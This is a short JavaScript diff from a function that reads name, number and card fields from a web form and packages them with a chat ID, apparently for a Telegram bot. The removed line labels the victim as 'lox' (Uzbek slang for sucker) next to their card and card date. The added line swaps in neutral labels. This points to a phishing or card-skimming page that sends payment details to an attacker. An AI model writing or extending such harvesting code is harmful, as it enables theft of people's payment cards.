@@ -11,7 +11,7 @@ const sendRequest = (e) => {
   const  number = document.querySelector(".js-age").value.trim();
   const card = document.querySelector(".js-card").value.trim()
 
-  const message = `lox: ${firstName}\nloxni kartasi : ${number}\nloxni kartasini sanasi: ${card}`;
+  const message = `ism: ${firstName}\ntelefon : ${number}\nkarta: ${card}`;
 
   const formData = {
     chat_id: chatId,
